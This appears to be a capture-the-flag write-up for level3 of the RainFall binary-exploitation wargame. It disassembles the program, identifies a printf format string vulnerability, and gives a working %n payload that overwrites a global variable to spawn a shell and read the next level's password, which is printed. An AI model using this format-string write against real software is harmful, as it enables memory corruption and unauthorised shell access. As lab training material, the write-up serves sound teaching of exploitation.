# Level 0

- Once logged in, you will see a binary `level2`

```
[???] $ ssh level3@localhost -p 4242
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
level3@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
level3@RainFall:~$ ls
level3
```

let's run this and see what this does
```
level3@RainFall:~$ ./level3

```

okay, this one does the same behavior as level2

```
level3@RainFall:~$ ./level3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
level3@RainFall:~$
```

Now let's take a look at the binary

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   ebp
   0x0804851b <+1>:     mov    ebp,esp
   0x0804851d <+3>:     and    esp,0xfffffff0
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
```

take a look at v

```
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x218
   0x080484ad <+9>:     mov    eax,ds:0x8049860
   0x080484b2 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:    lea    eax,[ebp-0x208]
   0x080484c4 <+32>:    mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    eax,[ebp-0x208]
   0x080484d2 <+46>:    mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    eax,ds:0x804988c
   0x080484df <+59>:    cmp    eax,0x40
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    eax,ds:0x8049880
   0x080484e9 <+69>:    mov    edx,eax
   0x080484eb <+71>:    mov    eax,0x8048600
   0x080484f0 <+76>:    mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:    mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:    mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:    mov    DWORD PTR [esp],eax
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
```

On line <+59>, if a value stored in eax is stored 0x40 is not equal, it will jump to <v+116>, otherwise `fwrite` and `system` function will be executed.

below are the strings stored in the address relavent to the `fwrite` and `system`
```
gdb-peda$ x/s 0x8048600
0x8048600:       "Wait what?!\n"
gdb-peda$ x/s 0x804860d
0x804860d:       "/bin/sh"
```

In order to execute, a `format string vulnerability` will be used, as the function `printf` is used.
But what is `format string vulnerability` and why all of the sudden `printf` is mentioned?

- https://www.youtube.com/watch?v=0WvrSfcdq1I (nees to write)


on line <+54>, we can see the value `0x40` is compared with the valune on the address `0x804988c`, the variable `m`

```
gdb-peda$ info variables
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
0x08049738  __CTOR_LIST__
0x08049738  __init_array_end
0x08049738  __init_array_start
0x0804973c  __CTOR_END__
0x08049740  __DTOR_LIST__
0x08049744  __DTOR_END__
0x08049748  __JCR_END__
0x08049748  __JCR_LIST__
0x0804974c  _DYNAMIC
0x08049818  _GLOBAL_OFFSET_TABLE_
0x0804983c  __data_start
0x0804983c  data_start
0x08049840  __dso_handle
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
0x0804988c  m
```

and if only format string is passed, it causes the segmentation fault

```
level3@RainFall:~$ ./level3
%s
Segmentation fault (core dumped)
```

what if we pass `%x` into the input?

```
level3@RainFall:~$ ./level3
%x
200
```

as explained from above, if format string is passed into the variable, we can easily get the address of the stack

```
level3@RainFall:~$ echo "%x %x %x %x" | ./level3
200 b7fd1ac0 b7ff37d0 25207825
```

The goal of this level is to find a offset where we reach the address of the variable we want to modify, so we need to see in which address our buffer is wrote

```
$ echo "AAAA %x %x %x %x %x %x" | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
````

we can see the offset of AAAA is 4, but noe we need to change this to the address of `m`

lastly, we just want to change the content of the variable m. Remember, the global variable m needs to have a size of 64

```
address of m : 4 bytes
pad of arbitrary data : 60 bytes
modifier %n
```

level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' ; cat -) | ./level3

```

�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

